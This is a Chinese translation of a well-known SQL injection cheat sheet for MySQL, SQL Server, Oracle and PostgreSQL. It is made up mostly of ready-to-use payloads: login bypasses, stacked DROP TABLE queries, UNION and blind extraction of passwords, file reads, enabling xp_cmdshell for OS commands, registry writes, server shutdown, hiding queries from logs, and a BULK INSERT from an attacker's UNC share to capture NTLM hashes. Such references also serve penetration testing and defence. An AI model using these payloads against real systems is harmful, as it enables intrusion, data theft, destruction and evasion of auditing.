# SQL注入速查表
<small>*本文由Yinzo翻译，转载请保留署名。原文地址：[http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell](http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell)*</small>

<small>*文档版本：1.4*</small>

## 关于SQL注入速查表
现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。

样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要

+ M:	MySQL
+ S: SQL Server
+ P:	PostgreSQL
+ O:	Oracle
+ +: (大概)其他所有数据库

*例子*：

+ (MS) 代表 : MySQL 和 SQL Server 等
+ (M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server

## 目录
1. 关于SQL注入速查表
1. 语法参考，攻击样例以及注入小技巧
    1. 行间注释
        1. 使用了行间注释的SQL注入攻击样例
    1. 行内注释
        1. 使用了行内注释的注入攻击样例
        1. MySQL版本探测攻击样例
    1. 堆叠查询(Stacking Queries)
        1. 支持堆叠查询的语言/数据库
        1. 关于MySQL和PHP
        1. 堆叠注入攻击样例
    1. If语句
        1. MySQL的If语句
        1. SQL Server的If语句
        1. 使用了If语句的注入攻击样例
    1. 整数(Integers)的使用
    1. 字符串操作
        1. 字符串的串联
    1. 没有引号的字符串
        1. 使用了16进制的注入攻击样例
    1. 字符串异化(Modification)与联系
    1. Union注入
        1. UNION-语言问题处理
    1. 绕过登陆界面(SMO+)
    1. 绕过检查MD5哈希的登陆界面
        1. 绕过MD5哈希检查的例子(MSP)
    1. 基于错误(Error Based)-探测字段名
        1. 使用`HAVING`来探测字段名(S)
        1. 在`SELECT`查询中使用`ORDER BY`探测字段数(MSO+)
    1. 数据类型、UNION、之类的
        1. 获取字段类型
    1. 简单的注入(MSO+)
    1. 有用的函数、信息收集、内置程序、大量注入笔记
        1. `@@version`(MS)
        1. 文件插入(Bulk Insert)(S)
        1. BCP(S)
        1. SQL Server的VBS/WSH(S)
        1. 执行系统命令，xp_cmdshell(S)
        1. SQL Server中的一些特殊的表(S)
        1. SQL Server的其它内置程序(S)
        1. 大量MSSQL笔记
        1. 使用LIMIT(M)或ORDER(MSO)的注入
        1. 关掉SQL Server(S)
    1. 在SQL Server 2005中启用xp_cmdshell
    1. 探测SQL Server数据库的结构(S)
        1. 获取用户定义表
        1. 获取字段名
    1. 移动记录(Moving records)(S)
    1. 快速的脱掉基于错误(Error Based)的SQL Server注入(S)


## 语法参考，攻击样例以及注入小技巧
### 行间注释
**注释掉查询语句的其余部分**
行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。

+ `--`(SM)

	`DROP sampletable;-- `

+ `#`(M)

	`DROP sampletable;# `
	
#### 使用了行间注释的SQL注入攻击样例
> 用户名:`admin'--`

+ 构成语句:`SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'`
这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。

### 行内注释
**通过不关闭注释注释掉查询语句的其余部分**，或者用于**绕过过滤**，移除空格，混淆，或探测数据库版本。

+ `/*注释内容*/`(SM)
	+ `DROP/*comment*/sampletable`
	+ `DR/**/OP/*绕过过滤*/sampletable`
	+ `SELECT/*替换空格*/password/**/FROM/**/Members`
+ `/*! MYSQL专属 */` (M) 

	这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。
	`SELECT /*!32302 1/0, */ 1 FROM tablename`

#### 使用了行内注释的注入攻击样例
> ID:`10; DROP TABLE members /*`

简单地摆脱了处理后续语句的麻烦，同样你可以使用`10; DROP TABLE members --`

#### MySQL版本探测攻击样例
> `SELECT /*!32302 1/0, */ 1 FROM tablename `

如果MySQL的版本高于**3.23.02**，会抛出一个`division by 0 error`

> ID:`/*!32302 10*/`

> ID:`10`

如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果

### 堆叠查询(Stacking Queries)
**一句代码之中执行多个查询语句**，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用

+ `;`(S)
	`SELECT * FROM members; DROP members--`
	结束一个查询并开始一个新的查询

#### 支持堆叠查询的语言/数据库
**绿色：**支持，**暗灰色：**不支持，**浅灰色：**未知
![支持堆叠查询的语言/数据库](http://ww2.sinaimg.cn/large/7d52f1ffgw1euwiy9impsj20dn03sgls.jpg)

#### 关于MySQL和PHP
阐明一些问题。

**PHP-MySQL不支持堆叠查询**，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？

*（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）*

#### 堆叠注入攻击样例
> ID:`10;DROP members --`

构成语句：`SELECT * FROM products WHERE id = 10; DROP members--`

这在执行完正常查询之后将会执行DROP查询。

### If语句
根据If语句得到响应。这是**盲注(Blind SQL Injection)的关键之一**，同样也能简单而**准确地**进行一些测试。

#### MySQL的If语句
+ `IF(condition,true-part,false-part)`(M)

	> `SELECT IF (1=1,'true','false')`

#### SQL Server的If语句
+ `IF condition true-part ELSE false-part`(S)

	> `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

#### 使用了If语句的注入攻击样例
> `if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0`(S)

如果当前用户不是**"sa"或者"dbo"**,就会抛出一个**`divide by zero error`**。

### 整数(Integers)的使用
对于绕过十分有用，比如**magic_quotes() 和其他类似过滤器**，甚至是各种WAF。

+ `0xHEXNUMBER`(SM)

	(HEXNUMBER:16进制数）
	你能这样使用16进制数：
	
	+ `SELECT CHAR(0x66)`(S)

	+ `SELECT 0x5045`(M) (这不是一个整数，而会是一个16进制字符串）
	
	+ `SELECT 0x50 + 0x45`(M) (现在这是整数了)

### 字符串操作
与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。

#### 字符串的串联
+ `+`(S)

	`SELECT login + '-' + password FROM members`

+ `||` (*MO) 

	`SELECT login || '-' || password FROM members`
	
***关于MySQL的"||"**
这个仅在ANSI模式下的MySQL执行，其他情况下都会当成'逻辑操作符'并返回一个0。更好的做法是使用`CONCAT()`函数。

+ `CONCAT(str1, str2, str3, ...)`(M)

	连接参数里的所有字符串
	例：`SELECT CONCAT(login, password) FROM members`
		
### 没有引号的字符串
有很多使用字符串的方法，但是这几个方法是一直可用的。使用`CHAR()`(MS)和`CONCAT()`(M)来生成没有引号的字符串

+ `0x457578` (M) - 16进制编码的字符串

	`SELECT 0x457578 `

	这在MySQL中会被当做字符串处理

+ 在MySQL中使用16进制字符串的一个简单方式：
`SELECT CONCAT('0x',HEX('c:\\boot.ini'))`

+ 在MySQL中使用`CONCAT()`函数：
`SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))` (M) 

	这会返回'KLM'

+ `SELECT CHAR(75)+CHAR(76)+CHAR(77)` (S) 

	这会返回'KLM'

#### 使用了16进制的注入攻击样例

+ `SELECT LOAD_FILE(0x633A5C626F6F742E696E69)` (M) 

	这会显示**c:\boot.ini**的内容

### 字符串异化(Modification)与联系
	
+ `ASCII()` (SMP) 

	返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。

	例：`SELECT ASCII('a')`

+ `CHAR()` (SM) 

	把整数转换为对应ASCII码的字符

	例：`SELECT CHAR(64)`

### Union注入
通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。
`SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members `

这会把news表和members表的内容合并返回。

另一个例子：
`' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

#### UNION-语言问题处理
当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。

+ 使用 `COLLATE SQL_Latin1_General_Cp1254_CS_AS`(S)

	或者其它的什么语句，具体的自己去查SQL Server的文档。
	例：`SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members`
	
+ `Hex()`(M)
	
	百试百灵~
	
### 绕过登陆界面(SMO+)

*SQL注入101式*(大概是原文名字吧？),登陆小技巧

+ `admin' --`
+ `admin' #`
+ `admin'/*`
+ `' or 1=1--`
+ `' or 1=1#`
+ `' or 1=1/*`
+ `') or '1'='1--`
+ `') or ('1'='1--`
+ ....
+ 以不同的用户登陆 (SM*) 
	`' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

**旧版本的MySQL不支持union*

### 绕过检查MD5哈希的登陆界面

如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。

#### 绕过MD5哈希检查的例子(MSP)
> 用户名：`admin`

> 密码：`1234 ' AND 1=0 UNION ALL SELECT 'admin','81dc9bdb52d04dc20036dbd8313ed055`

其中`81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)`

### 基于错误(Error Based)-探测字段名
#### 使用`HAVING`来探测字段名(S)

+ `' HAVING 1=1 --`
+ `' GROUP BY table.columnfromerror1 HAVING 1=1 --`
+ `' GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 --`
+ ……
+ `' GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 -- `
+ 直到它不再报错，就算搞定了

#### 在`SELECT`查询中使用`ORDER BY`探测字段数(MSO+)
通过ORDER BY来探测字段数能够加快union注入的速度。

+ `ORDER BY 1--`
+ `ORDER BY 2--`
+ ……
+ `ORDER BY N--` 
+ 一直到它报错为止，最后一个成功的数字就是字段数。

### 数据类型、UNION、之类的

**提示：**

+ 经常给**UNION**配上**ALL**使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)
+ 如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用`-1`或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。
+ 在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强
	+ 盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）
	
#### 获取字段类型

+ `' union select sum(columntofind) from users--` (S) 

		Microsoft OLE DB Provider for ODBC Drivers error '80040e07' 
		[Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument. 

	如果没有返回错误说明字段是**数字类型**
+ 同样的，你可以使用`CAST()`和`CONVERT()`
	+ 	`SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL--`
+ `11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-`

	没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。
+ `11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-`

	没报错 – 第一个字段是`integer`类型。
+ `11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 --`

	报错 – 第二个字段不是`integer`类型
	
+ `11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-`

	没报错 – 第二个字段是`string`类型。

+ `11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-`

	报错 – 第三个字段不是`integer` 
	
+ ……


		Microsoft OLE DB Provider for SQL Server error '80040e07' 
		Explicit conversion from data type int to image is not allowed.


**你在遇到union错误之前会先遇到convert()错误**，所以先使用convert()再用union

### 简单的注入(MSO+)
`'; insert into users values( 1, 'hax0r', 'coolpass', 9 )/*`

### 有用的函数、信息收集、内置程序、大量注入笔记

#### `@@version`(MS)
数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。

`INSERT INTO members(id, user, pass) VALUES(1, ''+SUBSTRING(@@version,1,10) ,10)`

#### 文件插入(Bulk Insert)(S)
把文件内容插入到表中。如果你不知道应用目录你可以去**读取IIS metabase file**(*仅IIS 6*)(*%systemroot%\system32\inetsrv\MetaBase.xml*)然后在里面找到应用目录。
	
1. 新建一个表foo(`line varchar(8000)`)
1. `BULK INSERT foo FROM 'c:\inetpub\wwwroot\login.asp'`
1. DROP了临时表，重复另一个文件

#### BCP(S)
写入文件。这个功能需要登录
`bcp "SELECT * FROM test..foo" queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar`

#### SQL Server的VBS/WSH(S)
由于ActiveX的支持，你能在SQL Server中使用VBS/WSH


	declare @o int 
	exec sp_oacreate 'wscript.shell', @o out 
	exec sp_oamethod @o, 'run', NULL, 'notepad.exe'

> Username: `'; declare @o int exec sp_oacreate 'wscript.shell', @o out exec sp_oamethod @o, 'run', NULL, 'notepad.exe' -- `

#### 执行系统命令，xp_cmdshell(S)
众所周知的技巧，SQL Server 2005默认是关闭的。你需要admin权限

`EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'`

用ping简单的测试一下，用之前先检查一下防火墙和嗅探器。

`EXEC master.dbo.xp_cmdshell 'ping '`

如果有错误，或者union或者其他的什么，你都不能直接读到结果。

#### SQL Server中的一些特殊的表(S)

+ Error Messages

	`master..sysmessages`
+ Linked Servers 

	`master..sysservers`
	
+ Password (2000和2005版本的都能被破解，这俩的加密算法很相似) 

	SQL Server 2000: masters..sysxlogins 
	
	SQL Server 2005 : sys.sql_logins 

#### SQL Server的其它内置程序(S)
1. 命令执行 (xp_cmdshell) 

	`exec master..xp_cmdshell 'dir'`

1. 注册表操作 (xp_regread)
	1. xp_regaddmultistring
	1. xp_regdeletekey
	1. xp_regdeletevalue
	1. xp_regenumkeys
	1. xp_regenumvalues
	1. xp_regread
	1. xp_regremovemultistring
	1. xp_regwrite 
		

			exec xp_regread HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet		\Services\lanmanserver\parameters', 'nullsessionshares' 
			exec xp_regenumvalues HKEY_LOCAL_MACHINE, 'SYSTEM		\CurrentControlSet	\Services\snmp\parameters\validcommunities'

1. 管理服务(xp_servicecontrol)
1. 媒体(xp_availablemedia)
1. ODBC 资源 (xp_enumdsn)
1. 登录 (xp_loginconfig)
1. 创建Cab文件 (xp_makecab)
1. 域名列举 (xp_ntsec_enumdomains)
1. 杀进程 (need PID) (xp_terminate_process)
1. 新建进程 (*实际上你想干嘛都行*) 
	
	
		sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
		exec xp_webserver


1. 写文件进UNC或者内部路径 (sp_makewebtask)

#### 大量MSSQL笔记
`SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/`

`DECLARE @result int; EXEC @result = xp_cmdshell 'dir *.exe';IF (@result = 0) SELECT 0 ELSE SELECT 1/0`

HOST_NAME() 
IS_MEMBER (Transact-SQL)  
IS_SRVROLEMEMBER (Transact-SQL)  
OPENDATASOURCE (Transact-SQL)

`INSERT tbl EXEC master..xp_cmdshell OSQL /Q"DBCC SHOWCONTIG"`

OPENROWSET (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms190312.aspx

你不能在 SQL Server 的Insert查询里使用子查询(sub select).

#### 使用LIMIT(M)或ORDER(MSO)的注入
`SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,'x'/*,10 ;`

如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。

#### 关掉SQL Server(S)
如果你真的急了眼，`';shutdown --`

### 在SQL Server 2005中启用xp_cmdshell
默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。


	EXEC sp_configure 'show advanced options',1 
	RECONFIGURE

	EXEC sp_configure 'xp_cmdshell',1 
	RECONFIGURE


### 探测SQL Server数据库的结构(S)
#### 获取用户定义表
`SELECT name FROM sysobjects WHERE xtype = 'U'`

#### 获取字段名
`SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')`

### 移动记录(Moving records)(S)
+ 修改WHERE，使用**NOT IN**或者**NOT EXIST**
	`... WHERE users NOT IN ('First User', 'Second User') `
	`SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)` -- 这个好用

+ 脏的不行的小技巧

	`SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id<=o.id) AS x, name from sysobjects o) as p where p.x=3) as int `

	`Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype='U' and i.id<=o.id) AS x, name from sysobjects o WHERE o.xtype = 'U') as p where p.x=21`
	
### 快速的脱掉基于错误(Error Based)的SQL Server注入(S)
`';BEGIN DECLARE @rt varchar(8000) SET @rd=':' SELECT @rd=@rd+' '+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'MEMBERS') AND name>@rd SELECT @rd AS rd into TMP_SYS_TMP end;--`

**详情请参考：[Fast way to extract data from Error Based SQL Injections](http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/)**


### 盲注
#### 关于盲注
一个经过完整而优秀开发的应用一般来说你是**看不到错误提示的**，所以你是没办法从Union攻击和错误中提取出数据的

**一般盲注**，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果

**完全盲注**，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。

在一般盲注下你能够使用**If语句**或者**WHERE查询注入***(一般来说比较简单)*，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用**WAIT FOR DELAY '0:0:10'**，在MySQL中使用**BENCHMARK()**，在PostgreSQL中使用**pg_sleep(10)**，以及在ORACLE中的一些**PL/SQL小技巧**。

#### 实战中的盲注实例
以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。

**TRUE**和**FALSE**标志代表了查询返回了true或false


	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>78-- 

	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>103-- 

	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>89-- 

	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>83-- 

	TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)>80-- 

	FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)


由于上面**后两个查询都是false**，我们能清楚的知道表名的第一个**字符的ASCII码是80，也就是"P"**。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。

### 延时盲注
首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。

#### `WAITFOR DELAY [time]`(S)
这就跟`sleep`差不多，等待特定的时间。通过CPU来让数据库进行等待。

`WAITFOR DELAY '0:0:10'--`

你也可以这样用

`WAITFOR DELAY '0:0:0.51'`

#### 实例
+ 俺是sa吗？
	`if (select user) = 'sa' waitfor delay '0:0:10'`
+ ProductID =`1;waitfor delay '0:0:10'--`
+ ProductID =`1);waitfor delay '0:0:10'--`
+ ProductID =`1';waitfor delay '0:0:10'--`
+ ProductID =`1');waitfor delay '0:0:10'--`
+ ProductID =`1));waitfor delay '0:0:10'--`
+ ProductID =`1'));waitfor delay '0:0:10'--`

#### `BENCHMARK()`(M)

一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。
`BENCHMARK(howmanytimes, do this)`

#### 实例
+ 俺是root吗？爽！
	`IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`
	
+ 判断表是否存在
	`IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`
	
#### `pg_sleep(seconds)`(P)
睡眠指定秒数。

+ `SELECT pg_sleep(10);`睡个十秒
	
	
### 掩盖痕迹
#### `-sp_password log bypass`(S)
出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。

### 注入测试
这些测试既简单又清晰，适用于盲注和悄悄地搞。

1. `product.asp?id=4 (SMO)`
	1. `product.asp?id=5-1`
	1. `product.asp?id=4 OR 1=1`

1. `product.asp?name=Book`
	1. `product.asp?name=Bo’%2b’ok`
	1. `product.asp?name=Bo’ || ’ok (OM)`
	1. `product.asp?name=Book’ OR ‘x’=’x`

### 一些其他的MySQL笔记
+ 子查询只能在MySQL4.1+使用
+ 用户
	+ `SELECT User,Password FROM mysql.user;`
+ `SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)='2',BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;`
+ `SELECT ... INTO DUMPFILE`
	+ 把查询写入一个**新文件**中(不能修改已有文件)
+ UDF功能
	+ `create function LockWorkStation returns integer soname 'user32';`
	+ `select LockWorkStation(); `
	+ `create function ExitProcess returns integer soname 'kernel32';`
	+ `select exitprocess();`
+ `SELECT USER();`
+ `SELECT password,USER() FROM mysql.user;`
+ admin密码哈希的第一位
	+ `SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;`
+ 文件读取
	+ `query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
+ MySQL读取文件内容
	+ **默认这个功能是没开启的！**

			create table foo( line blob ); 
			load data infile 'c:/boot.ini' into table foo; 
			select * from foo;
+ MySQL里的各种延时
+ `select benchmark( 500000, sha1( 'test' ) );
query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1`
+ `select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' ); `
+ **遍历数据，暴力猜解**
	+ `select if( (ascii(substring(user(),1,1)) >> 7) & 1,benchmark(100000,sha1('test')), 'false' );`

#### MySQL中好用的函数

+ `MD5()`
	
	MD5哈希

+ `SHA1()` 

	SHA1哈希

+ `PASSWORD()`
+ `ENCODE()`
+ `COMPRESS()` 
	
	压缩数据，在盲注时读取大量数据很好用

+ `ROW_COUNT()`
+ `SCHEMA()`
+ `VERSION()`

	跟`@@version`是一样的
	
### SQL注入的高级使用
一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）

> Name:`' + (SELECT TOP 1 password FROM users ) + '`

> Email : `xx@xx.com`

如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。

#### 强制SQL Server来得到NTLM哈希
这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain & Abel)捕捉NTLM session。

#### Bulk insert UNC共享文件 (S) 
`bulk insert foo from '\\YOURIPADDRESS\C$\x.txt'`

## 参考资料
因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请[给我发邮件](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*，我会尽快更新。

+ **各种资料**
	+ [Advanced SQL Injection In SQL Applications](http://www.ngssoftware.com/papers/advanced_sql_injection.pdf), *Chris Anley*
	+ [More Advanced SQL Injection In SQL Applications](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf), *Chris Anley*
	+ [Blindfolded SQL Injection, Ofer Maor](http://www.imperva.com/download.asp?id=4) – *Amichai Shulman*
	+ [Hackproofing MySQL](http://www.ngssoftware.com/papers/HackproofingMySQL.pdf), *Chris Anley*
	+ [Database Hacker's Handbook, David Litchfield](http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html), *Chris Anley, John Heasman, Bill Grindlay*
	+ **楼上的团队**！
+ **MSSQL相关**
	+ MSSQL Operators - http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx
	+ Transact-SQL Reference - http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx
	+ String Functions (Transact-SQL)  - http://msdn2.microsoft.com/en-us/library/ms181984.aspx
	+ List of MSSQL Server Collation Names - http://msdn2.microsoft.com/en-us/library/ms180175.aspx
	+ MSSQL Server 2005 Login Information and some other functions : [Sumit Siddharth](http://www.notsosecure.com/)
+ **MySQL相关**
	+ Comments : http://dev.mysql.com/doc/
	+ Control Flows - http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html
	+ MySQL Gotchas - http://sql-info.de/mysql/gotchas.htm
	+ [New SQL Injection Concept](http://www.securiteam.com/securityreviews/5KP0N1PC1W.html), *Tonu Samuel*

## 更新日志
+ 15/03/2007 - Public Release v1.0
+ 16/03/2007 - v1.1
	+ Links added for some paper and book references
	+ Collation sample added
	+ Some typos fixed
	+ Styles and Formatting improved
	+ New MySQL version and comment samples
	+ PostgreSQL Added to Ascii and legends, pg_sleep() added blind section
	+ Blind SQL Injection section and improvements, new samples
	+ Reference paper added for MySQL comments
+ 21/03/2007 - v1.2
	+ BENCHMARK() sample changed to avoid people DoS their MySQL Servers
	+ More Formatting and Typo
	+ Descriptions for some MySQL Function
+ 30/03/2007 v1.3
	+ Niko pointed out PotsgreSQL and PHP supports stacked queries
	+ Bypassing second MD5 check login screens description and attack added
	+ Mark came with extracting NTLM session idea, added
	+ Detailed Blind SQL Exploitation added
+ 13/04/2007 v1.4 - Release
	+ SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)
	+ [日文版SQL注入速查表发布](http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html) (*v1.1*)

### 待办事项 / 联系方式 / 帮助

我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，[给我发邮件吧](http://ferruh.mavituna.com/iletisim/)*(ferruh-at-mavituna.com)*